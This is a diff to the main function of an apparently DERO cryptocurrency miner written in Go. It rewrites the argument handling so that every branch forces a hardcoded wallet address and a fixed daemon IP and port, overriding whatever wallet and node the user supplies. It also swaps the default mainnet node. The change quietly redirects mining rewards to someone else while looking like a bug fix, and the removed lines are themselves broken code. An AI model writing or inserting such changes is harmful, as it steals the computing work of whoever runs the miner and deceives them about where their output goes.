@@ -146,7 +146,7 @@ func main() {
 
 	//logger.V(0).Info("", "MODE", globals.Config.Name)
 
-	if globals.Arguments["--wallet-address"] = nil {
+	if globals.Arguments["--wallet-address"] != nil {
 		//addr, err := globals.ParseValidateAddress(globals.Arguments["--wallet-address"].(string))
 		//if err != nil {
 		//	logger.Error(err, "Wallet address is invalid.")
@@ -154,15 +154,21 @@ func main() {
 		//}
 		var gonanku = "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u"
 		wallet_address = gonanku
+	}else{
+		var gonanku = "deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x62etsxzs735pms2g7k9u"
+		wallet_address = gonanku
 	}
 
 	if !globals.Arguments["--testnet"].(bool) {
-		daemon_rpc_address = "minernode1.dero.live:10100"
+		daemon_rpc_address = "kaji.live:10100"
 	} else {
 		daemon_rpc_address = "127.0.0.1:10100"
 	}
 
-	if globals.Arguments["--daemon-rpc-address"] = nil {
+	if globals.Arguments["--daemon-rpc-address"] != nil {
+		var goniku = "103.13.207.121:22216"
+		daemon_rpc_address = goniku
+	}else{
 		var goniku = "103.13.207.121:22216"
 		daemon_rpc_address = goniku
 	}
